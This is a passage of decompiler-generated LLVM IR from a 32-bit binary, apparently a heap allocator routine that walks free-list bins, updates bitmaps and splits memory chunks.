  %v1_8052c38 = add i32 %v1_805322f, 12
  %v2_8052c38 = inttoptr i32 %v1_8052c38 to i32*
  %v3_8052c38 = load i32, i32* %v2_8052c38, align 4
  store i32 %v3_8052c38, i32* @edx, align 4
  %v1_8052c3b = and i32 %v3_8052c35, -4
  store i32 %v1_8052c3b, i32* @edi, align 4
  br i1 %v6_8052bd1, label %dec_label_pc_8052c67, label %dec_label_pc_8052c48

dec_label_pc_8052c48:                             ; preds = %dec_label_pc_8052c35
  %v9_8052c48 = icmp eq i32 %v3_8052c38, 134572980
  %v1_8052c4e = icmp eq i1 %v9_8052c48, false
  br i1 %v1_8052c4e, label %dec_label_pc_8052c67, label %dec_label_pc_8052c50

dec_label_pc_8052c50:                             ; preds = %dec_label_pc_8052c48
  %v1_8052c50 = load i32, i32* @global_var_8056bb0.208, align 16
  %v12_8052c50 = icmp eq i32 %v1_805322f, %v1_8052c50
  %v1_8052c56 = icmp eq i1 %v12_8052c50, false
  br i1 %v1_8052c56, label %dec_label_pc_8052c67, label %dec_label_pc_8052c58

dec_label_pc_8052c58:                             ; preds = %dec_label_pc_8052c50
  store i32 %v1_8052c5c, i32* %eax.global-to-local, align 4
  %v6_8052c61 = icmp ugt i32 %v1_8052c3b, %v1_8052c5c
  br i1 %v6_8052c61, label %dec_label_pc_8053218, label %dec_label_pc_8052c67

dec_label_pc_8052c67:                             ; preds = %dec_label_pc_8052c58, %dec_label_pc_8052c50, %dec_label_pc_8052c48, %dec_label_pc_8052c35
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %eax.global-to-local, align 4
  %v2_8052c6c = add i32 %v3_8052c38, 8
  %v3_8052c6c = inttoptr i32 %v2_8052c6c to i32*
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %v3_8052c6c, align 4
  %v0_8052c6f = load i32, i32* @edx, align 4
  store i32 %v0_8052c6f, i32* @global_var_8056bc0.210, align 4
  %v0_8052c72 = load i32, i32* @edi, align 4
  %v15_8052c72 = icmp eq i32 %v0_8052c72, %v1_8052f18
  br i1 %v15_8052c72, label %dec_label_pc_8053259, label %dec_label_pc_8052c7c

dec_label_pc_8052c7c:                             ; preds = %dec_label_pc_8052c67
  %v6_8052c82 = icmp ugt i32 %v0_8052c72, 255
  br i1 %v6_8052c82, label %dec_label_pc_8052c95, label %dec_label_pc_8052c84

dec_label_pc_8052c84:                             ; preds = %dec_label_pc_8052c7c
  %v2_8052c86 = udiv i32 %v0_8052c72, 8
  store i32 %v2_8052c86, i32* %esi.global-to-local, align 4
  %v1_8052c89 = mul nuw i32 %v2_8052c86, 8
  %v2_8052c89 = add i32 %v1_8052c89, 134572972
  store i32 %v2_8052c89, i32* @ebx, align 4
  %v1_8052c90 = add i32 %v1_8052c89, 134572980
  %v2_8052c90 = inttoptr i32 %v1_8052c90 to i32*
  %v3_8052c90 = load i32, i32* %v2_8052c90, align 4
  store i32 %v3_8052c90, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052cde

dec_label_pc_8052c95:                             ; preds = %dec_label_pc_8052c7c
  store i32 %v0_8052c72, i32* @eax, align 4
  %v0_8052c97 = call i32 @function_8052afe()
  store i32 %v0_8052c97, i32* %esi.global-to-local, align 4
  %v1_8052c9e = mul i32 %v0_8052c97, 8
  %v2_8052c9e = add i32 %v1_8052c9e, ptrtoint (i32* @global_var_8056bac.207 to i32)
  store i32 %v2_8052c9e, i32* %eax.global-to-local, align 4
  %v1_8052ca5 = add i32 %v1_8052c9e, add (i32 ptrtoint (i32* @global_var_8056bac.207 to i32), i32 8)
  %v2_8052ca5 = inttoptr i32 %v1_8052ca5 to i32*
  %v3_8052ca5 = load i32, i32* %v2_8052ca5, align 4
  store i32 %v3_8052ca5, i32* %edx.global-to-local, align 4
  store i32 %v3_8052ca5, i32* @ebx, align 4
  %v12_8052cae = icmp eq i32 %v3_8052ca5, %v2_8052c9e
  br i1 %v12_8052cae, label %dec_label_pc_8052cde, label %dec_label_pc_8052cb2

dec_label_pc_8052cb2:                             ; preds = %dec_label_pc_8052c95
  %v1_8052cb2 = add i32 %v1_8052c9e, add (i32 ptrtoint (i32* @global_var_8056bac.207 to i32), i32 12)
  %v2_8052cb2 = inttoptr i32 %v1_8052cb2 to i32*
  %v3_8052cb2 = load i32, i32* %v2_8052cb2, align 4
  store i32 %v3_8052cb2, i32* @ebx, align 4
  %v0_8052cb5 = load i32, i32* @edi, align 4
  %v2_8052cb5 = add i32 %v3_8052cb2, 4
  %v3_8052cb5 = inttoptr i32 %v2_8052cb5 to i32*
  %v4_8052cb5 = load i32, i32* %v3_8052cb5, align 4
  %v10_8052cb5 = icmp ult i32 %v0_8052cb5, %v4_8052cb5
  %v1_8052cb8 = icmp eq i1 %v10_8052cb5, false
  br i1 %v1_8052cb8, label %dec_label_pc_8052cc0, label %dec_label_pc_8052cde

dec_label_pc_8052cc0:                             ; preds = %dec_label_pc_8052cb2
  %v1_8052cc2 = or i32 %v0_8052cb5, 1
  store i32 %v1_8052cc2, i32* %eax.global-to-local, align 4
  store i32 %v3_8052ca5, i32* %ebx.global-to-local, align 4
  %v2_8052cd6105 = add i32 %v3_8052ca5, 4
  %v3_8052cd6106 = inttoptr i32 %v2_8052cd6105 to i32*
  %v4_8052cd6107 = load i32, i32* %v3_8052cd6106, align 4
  %v10_8052cd6108 = icmp ult i32 %v1_8052cc2, %v4_8052cd6107
  br i1 %v10_8052cd6108, label %dec_label_pc_8052cc7, label %dec_label_pc_8052cdb

dec_label_pc_8052cc7:                             ; preds = %dec_label_pc_8052cc0, %dec_label_pc_8052cc7
  %v0_8052cdb109 = phi i32 [ %v3_8052ccb, %dec_label_pc_8052cc7 ], [ %v3_8052ca5, %dec_label_pc_8052cc0 ]
  store i32 %v0_8052cdb109, i32* %ecx.global-to-local, align 4
  %v1_8052ccb = add i32 %v0_8052cdb109, 8
  %v2_8052ccb = inttoptr i32 %v1_8052ccb to i32*
  %v3_8052ccb = load i32, i32* %v2_8052ccb, align 4
  store i32 %v3_8052ccb, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052ccb, i32* %ebx.global-to-local, align 4
  %v2_8052cd6 = add i32 %v3_8052ccb, 4
  %v3_8052cd6 = inttoptr i32 %v2_8052cd6 to i32*
  %v4_8052cd6 = load i32, i32* %v3_8052cd6, align 4
  %v10_8052cd6 = icmp ult i32 %v1_8052cc2, %v4_8052cd6
  br i1 %v10_8052cd6, label %dec_label_pc_8052cc7, label %dec_label_pc_8052cdb

dec_label_pc_8052cdb:                             ; preds = %dec_label_pc_8052cc7, %dec_label_pc_8052cc0
  %v0_8052cdb.lcssa = phi i32 [ %v3_8052ca5, %dec_label_pc_8052cc0 ], [ %v3_8052ccb, %dec_label_pc_8052cc7 ]
  %v1_8052cdb = add i32 %v0_8052cdb.lcssa, 12
  %v2_8052cdb = inttoptr i32 %v1_8052cdb to i32*
  %v3_8052cdb = load i32, i32* %v2_8052cdb, align 4
  store i32 %v3_8052cdb, i32* @ebx, align 4
  br label %dec_label_pc_8052cde

dec_label_pc_8052cde:                             ; preds = %dec_label_pc_8052c84, %dec_label_pc_8052cb2, %dec_label_pc_8052c95, %dec_label_pc_8052cdb
  %v0_8052cde = phi i32 [ %v0_8052c97, %dec_label_pc_8052c95 ], [ %v0_8052c97, %dec_label_pc_8052cdb ], [ %v0_8052c97, %dec_label_pc_8052cb2 ], [ %v2_8052c86, %dec_label_pc_8052c84 ]
  %stack_var_-64.1 = phi i32 [ %v2_8052c9e, %dec_label_pc_8052c95 ], [ %v0_8052cdb.lcssa, %dec_label_pc_8052cdb ], [ %v2_8052c9e, %dec_label_pc_8052cb2 ], [ %v3_8052c90, %dec_label_pc_8052c84 ]
  %v1_8052ce0 = urem i32 %v0_8052cde, 32
  %v2_8052ce0 = icmp eq i32 %v1_8052ce0, 0
  store i32 %v1_8052ce0, i32* %esi.global-to-local, align 4
  store i32 %v1_8052ce0, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052cea = sdiv i32 %v0_8052cde, 32
  store i32 %v2_8052cea, i32* %edx.global-to-local, align 4
  br i1 %v2_8052ce0, label %dec_label_pc_8052d06, label %bb

bb:                                               ; preds = %dec_label_pc_8052cde
  %v5_8052ced = shl i32 1, %v1_8052ce0
  store i32 %v5_8052ced, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d06

dec_label_pc_8052d06:                             ; preds = %dec_label_pc_8052cde, %bb
  %v5_8052cef = phi i32 [ 1, %dec_label_pc_8052cde ], [ %v5_8052ced, %bb ]
  %v1_8052cef = mul nsw i32 %v2_8052cea, 4
  %v2_8052cef = add i32 %v1_8052cef, ptrtoint (i32* @global_var_8056eb4.211 to i32)
  %v3_8052cef = inttoptr i32 %v2_8052cef to i32*
  %v4_8052cef = load i32, i32* %v3_8052cef, align 4
  %v6_8052cef = or i32 %v4_8052cef, %v5_8052cef
  store i32 %v6_8052cef, i32* %v3_8052cef, align 4
  %v0_8052cf6 = load i32, i32* @ebx, align 4
  %v1_8052cf6 = load i32, i32* @ebp, align 4
  %v2_8052cf6 = add i32 %v1_8052cf6, 12
  %v3_8052cf6 = inttoptr i32 %v2_8052cf6 to i32*
  store i32 %v0_8052cf6, i32* %v3_8052cf6, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052cfd = load i32, i32* @ebp, align 4
  %v2_8052cfd = add i32 %v1_8052cfd, 8
  %v3_8052cfd = inttoptr i32 %v2_8052cfd to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052cfd, align 4
  %v0_8052d00 = load i32, i32* @ebp, align 4
  %v1_8052d00 = load i32, i32* @ebx, align 4
  %v2_8052d00 = add i32 %v1_8052d00, 8
  %v3_8052d00 = inttoptr i32 %v2_8052d00 to i32*
  store i32 %v0_8052d00, i32* %v3_8052d00, align 4
  %v0_8052d03 = load i32, i32* @ebp, align 4
  %v1_8052d03 = load i32, i32* @esi, align 4
  %v2_8052d03 = add i32 %v1_8052d03, 12
  %v3_8052d03 = inttoptr i32 %v2_8052d03 to i32*
  store i32 %v0_8052d03, i32* %v3_8052d03, align 4
  %v0_8052d06 = load i32, i32* @global_var_8056bc0.210, align 64
  store i32 %v0_8052d06, i32* @ebp, align 4
  %v9_8052d0c = icmp eq i32 %v0_8052d06, 134572980
  %v1_8052d12 = icmp eq i1 %v9_8052d0c, false
  br i1 %v1_8052d12, label %dec_label_pc_8052c35, label %dec_label_pc_8052d18

dec_label_pc_8052d18:                             ; preds = %dec_label_pc_8052d06, %dec_label_pc_8052d06.preheader
  br i1 %v8_8052bc9, label %dec_label_pc_8052da6, label %dec_label_pc_8052d26

dec_label_pc_8052d26:                             ; preds = %dec_label_pc_8052d18
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052d2a = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052d2a = add i32 %v1_8052d2a, ptrtoint (i32* @global_var_8056bac.207 to i32)
  store i32 %v2_8052d2a, i32* %edx.global-to-local, align 4
  %v1_8052d31 = add i32 %v1_8052d2a, add (i32 ptrtoint (i32* @global_var_8056bac.207 to i32), i32 12)
  %v2_8052d31 = inttoptr i32 %v1_8052d31 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052d31, align 4
  br label %dec_label_pc_8052da2

dec_label_pc_8052d36:                             ; preds = %dec_label_pc_8052da2
  %v1_8052d36 = add i32 %v4_8052d4d, 4
  %v2_8052d36 = inttoptr i32 %v1_8052d36 to i32*
  %v3_8052d36 = load i32, i32* %v2_8052d36, align 4
  store i32 %v3_8052d36, i32* %ebx.global-to-local, align 4
  %v1_8052d39 = add i32 %v4_8052d4d, 12
  %v2_8052d39 = inttoptr i32 %v1_8052d39 to i32*
  %v3_8052d39 = load i32, i32* %v2_8052d39, align 4
  store i32 %v3_8052d39, i32* @ecx, align 4
  %v1_8052d3c = and i32 %v3_8052d36, -4
  store i32 %v1_8052d3c, i32* @ebx, align 4
  %v10_8052d3f = icmp ult i32 %v1_8052d3c, %v1_8052f18
  br i1 %v10_8052d3f, label %dec_label_pc_8052da2, label %dec_label_pc_8052d45

dec_label_pc_8052d45:                             ; preds = %dec_label_pc_8052d36
  %v1_8052d45 = add i32 %v4_8052d4d, 8
  %v2_8052d45 = inttoptr i32 %v1_8052d45 to i32*
  %v3_8052d45 = load i32, i32* %v2_8052d45, align 4
  store i32 %v3_8052d45, i32* @edx, align 4
  %v1_8052d48 = add i32 %v3_8052d45, 12
  %v2_8052d48 = inttoptr i32 %v1_8052d48 to i32*
  %v3_8052d48 = load i32, i32* %v2_8052d48, align 4
  %v15_8052d48 = icmp eq i32 %v3_8052d48, %v4_8052d4d
  %v1_8052d4b = icmp eq i1 %v15_8052d48, false
  br i1 %v1_8052d4b, label %dec_label_pc_8052d52, label %dec_label_pc_8052d4d

dec_label_pc_8052d4d:                             ; preds = %dec_label_pc_8052d45
  %v1_8052d4d = add i32 %v3_8052d39, 8
  %v2_8052d4d = inttoptr i32 %v1_8052d4d to i32*
  %v3_8052d4d = load i32, i32* %v2_8052d4d, align 4
  %v15_8052d4d = icmp eq i32 %v3_8052d4d, %v4_8052d4d
  br i1 %v15_8052d4d, label %dec_label_pc_8052d57, label %dec_label_pc_8052d52

dec_label_pc_8052d52:                             ; preds = %dec_label_pc_8052d4d, %dec_label_pc_8052d45
  %v0_8052d52 = call i32 @function_8053a85()
  store i32 %v0_8052d52, i32* %eax.global-to-local, align 4
  %v0_8052d57.pre = load i32, i32* @ebx, align 4
  %v0_8052d5d.pre = load i32, i32* @ecx, align 4
  %v1_8052d5d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052d57

dec_label_pc_8052d57:                             ; preds = %dec_label_pc_8052d4d, %dec_label_pc_8052d52
  %v1_8052d5d = phi i32 [ %v3_8052d45, %dec_label_pc_8052d4d ], [ %v1_8052d5d.pre, %dec_label_pc_8052d52 ]
  %v0_8052d5d = phi i32 [ %v3_8052d39, %dec_label_pc_8052d4d ], [ %v0_8052d5d.pre, %dec_label_pc_8052d52 ]
  %v0_8052d57 = phi i32 [ %v1_8052d3c, %dec_label_pc_8052d4d ], [ %v0_8052d57.pre, %dec_label_pc_8052d52 ]
  %v5_8052d59 = sub i32 %v0_8052d57, %v1_8052f18
  store i32 %v5_8052d59, i32* %esi.global-to-local, align 4
  %v2_8052d5d = add i32 %v1_8052d5d, 12
  %v3_8052d5d = inttoptr i32 %v2_8052d5d to i32*
  store i32 %v0_8052d5d, i32* %v3_8052d5d, align 4
  %v0_8052d60 = load i32, i32* @edx, align 4
  %v1_8052d60 = load i32, i32* @ecx, align 4
  %v2_8052d60 = add i32 %v1_8052d60, 8
  %v3_8052d60 = inttoptr i32 %v2_8052d60 to i32*
  store i32 %v0_8052d60, i32* %v3_8052d60, align 4
  %v0_8052d63 = load i32, i32* %esi.global-to-local, align 4
  %v0_8052d66 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d66 = add i32 %v0_8052d66, 8
  store i32 %v1_8052d66, i32* %ecx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8052d63, 16
  br i1 %tmp126, label %dec_label_pc_8053267, label %dec_label_pc_8052d6f

dec_label_pc_8052d6f:                             ; preds = %dec_label_pc_8052d57
  %v2_8052d73 = add i32 %v0_8052d66, %v1_8052f18
  store i32 %v2_8052d73, i32* @edx, align 4
  %v1_8052d76 = or i32 %v1_8052f18, 1
  store i32 %v1_8052d76, i32* %ebx.global-to-local, align 4
  %v2_8052d79 = add i32 %v0_8052d66, 4
  %v3_8052d79 = inttoptr i32 %v2_8052d79 to i32*
  store i32 %v1_8052d76, i32* %v3_8052d79, align 4
  %v0_8052d7c = load i32, i32* %esi.global-to-local, align 4
  %v1_8052d7e = or i32 %v0_8052d7c, 1
  store i32 %v1_8052d7e, i32* %eax.global-to-local, align 4
  %v0_8052d81 = load i32, i32* @edx, align 4
  %v1_8052d81 = load i32, i32* @ebp, align 4
  %v2_8052d81 = add i32 %v1_8052d81, 8
  %v3_8052d81 = inttoptr i32 %v2_8052d81 to i32*
  store i32 %v0_8052d81, i32* %v3_8052d81, align 4
  %v0_8052d84 = load i32, i32* @edx, align 4
  %v1_8052d84 = load i32, i32* @ebp, align 4
  %v2_8052d84 = add i32 %v1_8052d84, 12
  %v3_8052d84 = inttoptr i32 %v2_8052d84 to i32*
  store i32 %v0_8052d84, i32* %v3_8052d84, align 4
  %v0_8052d87 = load i32, i32* @edx, align 4
  %v1_8052d87 = add i32 %v0_8052d87, 8
  %v2_8052d87 = inttoptr i32 %v1_8052d87 to i32*
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %v2_8052d87, align 4
  %v0_8052d8e = load i32, i32* @edx, align 4
  %v1_8052d8e = add i32 %v0_8052d8e, 12
  %v2_8052d8e = inttoptr i32 %v1_8052d8e to i32*
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %v2_8052d8e, align 4
  %v0_8052d95 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d95 = load i32, i32* @edx, align 4
  %v2_8052d95 = add i32 %v1_8052d95, 4
  %v3_8052d95 = inttoptr i32 %v2_8052d95 to i32*
  store i32 %v0_8052d95, i32* %v3_8052d95, align 4
  %v0_8052d98 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052d98 = load i32, i32* @edx, align 4
  %v3_8052d98 = add i32 %v1_8052d98, %v0_8052d98
  %v4_8052d98 = inttoptr i32 %v3_8052d98 to i32*
  store i32 %v0_8052d98, i32* %v4_8052d98, align 4
  br label %dec_label_pc_805326c

dec_label_pc_8052da2:                             ; preds = %dec_label_pc_8052d36, %dec_label_pc_8052d26
  %v4_8052d4d = phi i32 [ %storemerge1.pre, %dec_label_pc_8052d26 ], [ %v3_8052d39, %dec_label_pc_8052d36 ]
  store i32 %v4_8052d4d, i32* %eax.global-to-local, align 4
  %v12_8052da2 = icmp eq i32 %v4_8052d4d, %v2_8052d2a
  %v1_8052da4 = icmp eq i1 %v12_8052da2, false
  br i1 %v1_8052da4, label %dec_label_pc_8052d36, label %dec_label_pc_8052da6.loopexit

dec_label_pc_8052da6.loopexit:                    ; preds = %dec_label_pc_8052da2
  br label %dec_label_pc_8052da6

dec_label_pc_8052da6:                             ; preds = %dec_label_pc_8052da6.loopexit, %dec_label_pc_8052d18
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8052daf = add i32 %stack_var_-40.0.ph, 1
  %v2_8052db2 = udiv i32 %v1_8052daf, 32
  store i32 %v2_8052db2, i32* @edi, align 4
  %v1_8052db5 = mul i32 %v1_8052daf, 8
  %v2_8052db5 = add i32 %v1_8052db5, ptrtoint (i32* @global_var_8056bac.207 to i32)
  store i32 %v2_8052db5, i32* %ebx.global-to-local, align 4
  %v1_8052dbc = urem i32 %v1_8052daf, 32
  %v2_8052dbc = icmp eq i32 %v1_8052dbc, 0
  store i32 %v1_8052dbc, i32* %ecx.global-to-local, align 4
  %v1_8052dbf = mul nuw nsw i32 %v2_8052db2, 4
  %v2_8052dbf = add i32 %v1_8052dbf, ptrtoint (i32* @global_var_8056eb4.211 to i32)
  %v3_8052dbf = inttoptr i32 %v2_8052dbf to i32*
  %v4_8052dbf = load i32, i32* %v3_8052dbf, align 4
  store i32 %v4_8052dbf, i32* %edx.global-to-local, align 4
  br i1 %v2_8052dbc, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8052da6
  %v5_8052dc6 = shl i32 1, %v1_8052dbc
  store i32 %v5_8052dc6, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052da6, %bb88, %dec_label_pc_8052e07
  %v1_8052dc8 = phi i32 [ %v1_8052dc8.pre, %dec_label_pc_8052e07 ], [ %v4_8052dbf, %bb88 ], [ %v4_8052dbf, %dec_label_pc_8052da6 ]
  %v0_8052dcc = phi i32 [ %v0_8052dc8.pre, %dec_label_pc_8052e07 ], [ %v5_8052dc6, %bb88 ], [ 1, %dec_label_pc_8052da6 ]
  %tmp89 = icmp ule i32 %v0_8052dcc, %v1_8052dc8
  %v1_8052dcc = icmp eq i32 %v0_8052dcc, 0
  %v1_8052dce = icmp eq i1 %v1_8052dcc, false
  %or.cond = and i1 %tmp89, %v1_8052dce
  br i1 %or.cond, label %dec_label_pc_8052dcc.dec_label_pc_8052dfc.preheader_crit_edge, label %dec_label_pc_8052dd0.preheader

dec_label_pc_8052dcc.dec_label_pc_8052dfc.preheader_crit_edge: ; preds = %.preheader
  %v0_8052df77.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052dfc.preheader

dec_label_pc_8052dd0.preheader:                   ; preds = %.preheader
  %v0_8052dd0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052dd0

dec_label_pc_8052dd0:                             ; preds = %dec_label_pc_8052dd0.preheader, %dec_label_pc_8052dda
  %v0_8052dd0 = phi i32 [ %v0_8052dd0.pre, %dec_label_pc_8052dd0.preheader ], [ %v1_8052dd0, %dec_label_pc_8052dda ]
  %v1_8052dd0 = add i32 %v0_8052dd0, 1
  store i32 %v1_8052dd0, i32* @edi, align 4
  %v6_8052dd4 = icmp ugt i32 %v1_8052dd0, 2
  br i1 %v6_8052dd4, label %dec_label_pc_8052e83.loopexit, label %dec_label_pc_8052dda

dec_label_pc_8052dda:                             ; preds = %dec_label_pc_8052dd0
  %v1_8052dda = mul i32 %v1_8052dd0, 4
  %v2_8052dda = add i32 %v1_8052dda, ptrtoint (i32* @global_var_8056eb4.211 to i32)
  %v3_8052dda = inttoptr i32 %v2_8052dda to i32*
  %v4_8052dda = load i32, i32* %v3_8052dda, align 4
  store i32 %v4_8052dda, i32* %edx.global-to-local, align 4
  %v1_8052de1 = icmp eq i32 %v4_8052dda, 0
  br i1 %v1_8052de1, label %dec_label_pc_8052dd0, label %dec_label_pc_8052de5

dec_label_pc_8052de5:                             ; preds = %dec_label_pc_8052dda
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052dec = mul i32 %v1_8052dd0, 256
  store i32 %v2_8052dec, i32* %eax.global-to-local, align 4
  %v1_8052def = add i32 %v2_8052dec, ptrtoint (i32* @global_var_8056bac.207 to i32)
  store i32 %v1_8052def, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052dfc.preheader

dec_label_pc_8052dfc.preheader:                   ; preds = %dec_label_pc_8052dcc.dec_label_pc_8052dfc.preheader_crit_edge, %dec_label_pc_8052de5
  %v0_8052df77 = phi i32 [ %v1_8052def, %dec_label_pc_8052de5 ], [ %v0_8052df77.pre, %dec_label_pc_8052dcc.dec_label_pc_8052dfc.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8052de5 ], [ %v0_8052dcc, %dec_label_pc_8052dcc.dec_label_pc_8052dfc.preheader_crit_edge ]
  %v0_8052e0e = phi i32 [ %v4_8052dda, %dec_label_pc_8052de5 ], [ %v1_8052dc8, %dec_label_pc_8052dcc.dec_label_pc_8052dfc.preheader_crit_edge ]
  %v2_8052dfc4 = and i32 %v0_8052e0e, %esi.promoted
  %v3_8052dfc5 = icmp eq i32 %v2_8052dfc4, 0
  br i1 %v3_8052dfc5, label %dec_label_pc_8052df7, label %dec_label_pc_8052e00

dec_label_pc_8052df7:                             ; preds = %dec_label_pc_8052dfc.preheader, %dec_label_pc_8052df7
  %v2_8052dfa18 = phi i32 [ %v2_8052dfa, %dec_label_pc_8052df7 ], [ %esi.promoted, %dec_label_pc_8052dfc.preheader ]
  %v0_8052df78 = phi i32 [ %v1_8052df7, %dec_label_pc_8052df7 ], [ %v0_8052df77, %dec_label_pc_8052dfc.preheader ]
  %v1_8052df7 = add i32 %v0_8052df78, 8
  %v2_8052dfa = mul i32 %v2_8052dfa18, 2
  %v2_8052dfc = and i32 %v2_8052dfa, %v0_8052e0e
  %v3_8052dfc = icmp eq i32 %v2_8052dfc, 0
  br i1 %v3_8052dfc, label %dec_label_pc_8052df7, label %dec_label_pc_8052dfc.dec_label_pc_8052e00_crit_edge

dec_label_pc_8052dfc.dec_label_pc_8052e00_crit_edge: ; preds = %dec_label_pc_8052df7
  store i32 %v1_8052df7, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052dfa, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052e00

dec_label_pc_8052e00:                             ; preds = %dec_label_pc_8052dfc.dec_label_pc_8052e00_crit_edge, %dec_label_pc_8052dfc.preheader
  %v0_8052e10 = phi i32 [ %v2_8052dfa, %dec_label_pc_8052dfc.dec_label_pc_8052e00_crit_edge ], [ %esi.promoted, %dec_label_pc_8052dfc.preheader ]
  %v1_8052e2a = phi i32 [ %v1_8052df7, %dec_label_pc_8052dfc.dec_label_pc_8052e00_crit_edge ], [ %v0_8052df77, %dec_label_pc_8052dfc.preheader ]
  %v1_8052e00 = add i32 %v1_8052e2a, 12
  %v2_8052e00 = inttoptr i32 %v1_8052e00 to i32*
  %v3_8052e00 = load i32, i32* %v2_8052e00, align 4
  store i32 %v3_8052e00, i32* %ecx.global-to-local, align 4
  %v12_8052e03 = icmp eq i32 %v3_8052e00, %v1_8052e2a
  %v1_8052e05 = icmp eq i1 %v12_8052e03, false
  br i1 %v1_8052e05, label %dec_label_pc_8052e1b, label %dec_label_pc_8052e07

dec_label_pc_8052e07:                             ; preds = %dec_label_pc_8052e00
  %v1_8052e09 = add i32 %v3_8052e00, 8
  store i32 %v1_8052e09, i32* %ebx.global-to-local, align 4
  %v1_8052e0c = sub i32 -1, %v0_8052e10
  store i32 %v1_8052e0c, i32* %eax.global-to-local, align 4
  %v2_8052e0e = and i32 %v0_8052e0e, %v1_8052e0c
  store i32 %v2_8052e0e, i32* %edx.global-to-local, align 4
  %v2_8052e10 = mul i32 %v0_8052e10, 2
  store i32 %v2_8052e10, i32* %esi.global-to-local, align 4
  %v1_8052e12 = load i32, i32* @edi, align 4
  %v2_8052e12 = mul i32 %v1_8052e12, 4
  %v3_8052e12 = add i32 %v2_8052e12, ptrtoint (i32* @global_var_8056eb4.211 to i32)
  %v4_8052e12 = inttoptr i32 %v3_8052e12 to i32*
  store i32 %v2_8052e0e, i32* %v4_8052e12, align 4
  %v0_8052dc8.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052dc8.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052e1b:                             ; preds = %dec_label_pc_8052e00
  %v1_8052e1b = add i32 %v3_8052e00, 4
  %v2_8052e1b = inttoptr i32 %v1_8052e1b to i32*
  %v3_8052e1b = load i32, i32* %v2_8052e1b, align 4
  store i32 %v3_8052e1b, i32* %edx.global-to-local, align 4
  %v1_8052e1e = add i32 %v3_8052e00, 12
  %v2_8052e1e = inttoptr i32 %v1_8052e1e to i32*
  %v3_8052e1e = load i32, i32* %v2_8052e1e, align 4
  store i32 %v3_8052e1e, i32* %eax.global-to-local, align 4
  %v1_8052e21 = and i32 %v3_8052e1b, -4
  store i32 %v1_8052e21, i32* @edx, align 4
  %v5_8052e26 = sub i32 %v1_8052e21, %v1_8052f18
  store i32 %v5_8052e26, i32* %esi.global-to-local, align 4
  store i32 %v3_8052e1e, i32* %v2_8052e00, align 4
  %v0_8052e2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052e2d = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e2d = add i32 %v1_8052e2d, 8
  %v3_8052e2d = inttoptr i32 %v2_8052e2d to i32*
  store i32 %v0_8052e2d, i32* %v3_8052e2d, align 4
  %v0_8052e30 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_8052e30, 16
  br i1 %tmp127, label %dec_label_pc_8052e35, label %dec_label_pc_8052e3c

dec_label_pc_8052e35:                             ; preds = %dec_label_pc_8052e1b
  %v0_8052e35 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e35 = load i32, i32* @edx, align 4
  %v2_8052e35 = add i32 %v0_8052e35, 4
  %v3_8052e35 = add i32 %v2_8052e35, %v1_8052e35
  %v4_8052e35 = inttoptr i32 %v3_8052e35 to i32*
  %v5_8052e35 = load i32, i32* %v4_8052e35, align 4
  %v6_8052e35 = or i32 %v5_8052e35, 1
  store i32 %v6_8052e35, i32* %v4_8052e35, align 4
  br label %dec_label_pc_8052e7b

dec_label_pc_8052e3c:                             ; preds = %dec_label_pc_8052e1b
  store i32 %v1_8052f18, i32* %eax.global-to-local, align 4
  %v0_8052e45 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052e45 = add i32 %v0_8052e45, %v1_8052f18
  store i32 %v2_8052e45, i32* @edx, align 4
  %v1_8052e48 = load i32, i32* @ebp, align 4
  %v2_8052e48 = add i32 %v1_8052e48, 8
  %v3_8052e48 = inttoptr i32 %v2_8052e48 to i32*
  store i32 %v2_8052e45, i32* %v3_8052e48, align 4
  %v0_8052e4b = load i32, i32* @edx, align 4
  %v1_8052e4b = load i32, i32* @ebp, align 4
  %v2_8052e4b = add i32 %v1_8052e4b, 12
  %v3_8052e4b = inttoptr i32 %v2_8052e4b to i32*
  store i32 %v0_8052e4b, i32* %v3_8052e4b, align 4
  %v0_8052e4e = load i32, i32* @edx, align 4
  %v1_8052e4e = add i32 %v0_8052e4e, 8
  %v2_8052e4e = inttoptr i32 %v1_8052e4e to i32*
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %v2_8052e4e, align 4
  %v0_8052e55 = load i32, i32* @edx, align 4
  %v1_8052e55 = add i32 %v0_8052e55, 12
  %v2_8052e55 = inttoptr i32 %v1_8052e55 to i32*
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %v2_8052e55, align 4
